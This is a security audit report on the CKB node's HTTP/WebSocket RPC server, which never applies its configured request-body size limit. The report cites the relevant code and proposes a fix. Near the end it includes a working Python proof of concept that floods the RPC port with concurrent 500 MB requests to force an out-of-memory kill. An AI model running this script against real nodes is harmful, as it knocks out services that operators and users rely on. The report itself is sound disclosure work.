Audit Report

## Title
`max_request_body_size` Config Value Is Never Enforced in the HTTP/WebSocket RPC Server, Allowing Unbounded Memory Consumption via Oversized Requests - (File: `rpc/src/server.rs`)

## Summary
The CKB node declares a `max_request_body_size` configuration field (defaulting to 10 MiB) in `RpcConfig`, but this value is never passed to `start_server` and no body-size-limiting middleware is applied to the axum router. As a result, any caller can POST arbitrarily large request bodies, causing axum to buffer the entire payload into heap memory before `handle_jsonrpc` is invoked, enabling memory exhaustion and OOM-kill of the node process.

## Finding Description

`RpcConfig` declares `max_request_body_size: usize` and the shipped `ckb.toml` sets it to 10 MiB: [1](#0-0) [2](#0-1) 

In `RpcServer::new()`, `start_server` is called for both the HTTP and WebSocket endpoints, but only `address`, `handler`, and `enable_websocket` are forwarded — `max_request_body_size` is never passed: [3](#0-2) 

Inside `start_server`, the axum `Router` is assembled with only `CorsLayer::permissive()` and `TimeoutLayer` — no `RequestBodyLimitLayer` or equivalent is present: [4](#0-3) 

The `handle_jsonrpc` handler receives `req_body: Bytes` — axum buffers the entire request body into a heap allocation before the handler is invoked, with no enforced cap: [5](#0-4) 

A codebase-wide search for `RequestBodyLimit`, `body_limit`, or `BodyLimit` returns zero matches in the RPC stack, confirming no body size enforcement exists anywhere in the HTTP/WebSocket path.

By contrast, the TCP RPC server does apply a per-line limit of 2 MiB via `LinesCodec::new_with_max_length`, but the HTTP and WebSocket paths have no equivalent protection: [6](#0-5) 

Additionally, `rpc_batch_limit` is `None` by default (commented out in the shipped config), so the batch-size guard in `handle_jsonrpc` is also inactive by default: [7](#0-6) [8](#0-7) 

## Impact Explanation
**High.** An attacker who can reach the RPC HTTP port sends one or more POST requests with multi-gigabyte JSON bodies. The axum runtime buffers each body fully into heap memory before `handle_jsonrpc` is called. Sending several such requests concurrently exhausts available RAM, triggering an OOM-kill of the `ckb` process. This terminates all node services — block relay, sync, transaction pool, and RPC — constituting a complete denial of service requiring manual restart. This matches the allowed impact: **"Vulnerabilities which could easily crash a CKB node" (High, 10001–15000 points)**.

## Likelihood Explanation
**Medium.** By default the RPC binds to `127.0.0.1:8114`, restricting direct internet exposure. However, many operators expose the RPC port to broader networks for dApp backends, mining pools, or monitoring. The WebSocket endpoint (`ws_listen_address`) is served by the same unprotected `start_server` path. Any local process on the same machine (e.g., a compromised dependency or co-located service) can reach `127.0.0.1:8114` without authentication. The attack requires only a standard HTTP client and a large payload — no special knowledge of CKB internals is needed, and it is trivially repeatable.

## Recommendation
Pass `max_request_body_size` through from `RpcServer::new` to `start_server`, and apply `tower_http::limit::RequestBodyLimitLayer` to the axum router:

```rust
use tower_http::limit::RequestBodyLimitLayer;

fn start_server(
    rpc: &Arc<MetaIoHandler<Option<Session>>>,
    address: String,
    handler: Handle,
    enable_websocket: bool,
    max_request_body_size: usize,
) -> Result<SocketAddr, AnyError> {
    // ...
    let app = Router::new()
        .route("/", method_router.clone())
        .route("/{*path}", method_router)
        .route("/ping", get(ping_handler))
        .layer(Extension(Arc::clone(rpc)))
        .layer(CorsLayer::permissive())
        .layer(RequestBodyLimitLayer::new(max_request_body_size))
        .layer(TimeoutLayer::with_status_code(
            StatusCode::REQUEST_TIMEOUT,
            Duration::from_secs(30),
        ))
        .layer(Extension(stream_config));
```

Also enable `rpc_batch_limit` by default in the shipped `ckb.toml` to prevent unbounded batch-request memory amplification.

## Proof of Concept

With a CKB node running with default config (`127.0.0.1:8114`):

```python
import requests, threading

url = "http://127.0.0.1:8114/"
# 500 MB JSON body
payload = '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":["' + "aa" * 250_000_000 + '"]}'

def attack():
    try:
        requests.post(url, data=payload, headers={"Content-Type": "application/json"})
    except Exception:
        pass

threads = [threading.Thread(target=attack) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()
```

Each concurrent request causes axum to allocate ~500 MB on the heap before `handle_jsonrpc` is reached. Eight concurrent requests attempt to allocate ~4 GB, exhausting memory on typical node hardware and triggering an OOM-kill of the `ckb` process.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/server.rs (L59-78)
```rust
        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-221)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
```

**File:** rpc/src/server.rs (L274-282)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }
```
